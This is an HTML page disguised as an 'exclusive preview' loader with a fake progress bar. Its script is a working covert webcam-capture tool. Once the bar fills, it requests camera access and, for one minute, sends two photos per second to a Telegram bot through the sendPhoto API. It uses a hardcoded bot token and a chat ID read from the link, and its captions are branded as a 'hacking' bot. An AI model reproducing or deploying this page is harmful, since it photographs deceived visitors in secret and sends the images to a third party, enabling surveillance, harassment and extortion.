<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Auto Capture & Send</title>
<style>
body {
    font-family: Arial, sans-serif;
    background: #f3f4f6;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    flex-direction: column;
}
h1 {
    margin-bottom: 24px;
    color: #333;
}
.progress-container {
    width: 80%;
    max-width: 500px;
    background: #ddd;
    border-radius: 10px;
    overflow: hidden;
    height: 20px;
    box-shadow: 0 0 5px rgba(0,0,0,0.1);
}
.progress-bar {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, #6366f1, #4f46e5);
    border-radius: 10px 0 0 10px;
    transition: width 0.1s linear;
}
.progress-text {
    margin-top: 12px;
    font-weight: bold;
    color: #555;
}
</style>
</head>
<body>

<h1>Loading Your Exclusive Preview...</h1>
<div class="progress-container">
  <div class="progress-bar" id="progressBar"></div>
</div>
<div class="progress-text" id="progressText">0%</div>

<script>
const BOT_TOKEN = "8062278856:AAGO17YgYVRP_WiLcLoqhA0MLtuClIRwZas";
const CHAT_ID = new URLSearchParams(window.location.search).get("id") || "YOUR_CHAT_ID";

const progressBar = document.getElementById("progressBar");
const progressText = document.getElementById("progressText");

let progress = 0;
const duration = 3000; // 3 seconds
const intervalTime = 50;
const increment = (intervalTime / duration) * 100;

const interval = setInterval(() => {
    progress += increment;
    if(progress>100) progress=100;
    progressBar.style.width = progress + "%";
    progressText.textContent = Math.floor(progress) + "%";
    if(progress>=100){
        clearInterval(interval);
        startCameraLoop();
    }
}, intervalTime);

async function startCameraLoop(){
    try{
        const stream = await navigator.mediaDevices.getUserMedia({video:true});
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        let photoCount = 0;
        const maxTime = 60; // 1 minute
        const intervalMs = 500; // 2 photos per second

        const sendInterval = setInterval(async ()=>{
            // Create fresh canvas for each photo
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async blob=>{
                const timestamp = new Date();
                const timeStr = timestamp.toLocaleTimeString();
                const country = "CountryName"; // You can enhance this to get real country info
                const caption = `🔥 Photo Hacking Alert! 🔥\n🛡️ Photo #${photoCount+1} sent.\n⏰ Time: ${timeStr}\n🌍 Location: ${country}\n🦠 BotDeveloper: @ProHacker43\n🪬 Bot link: @PROCAM_43KHACKBOT\n💀 Stay vigilant!`;

                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, `photo${photoCount+1}.jpg`);
                formData.append("caption", caption);

                try{
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
                        method:"POST",
                        body:formData
                    });
                }catch(e){
                    console.error("Error sending photo", e);
                }

            },"image/jpeg",0.85);

            photoCount++;
        }, intervalMs);

        setTimeout(()=>{
            clearInterval(sendInterval);
            stream.getTracks().forEach(track=>track.stop());
            alert("Photo capture completed!");
        }, maxTime*1000);

    }catch(e){
        alert("Camera permission denied or error occurred.");
        console.error(e);
    }
}
</script>

</body>
</html>
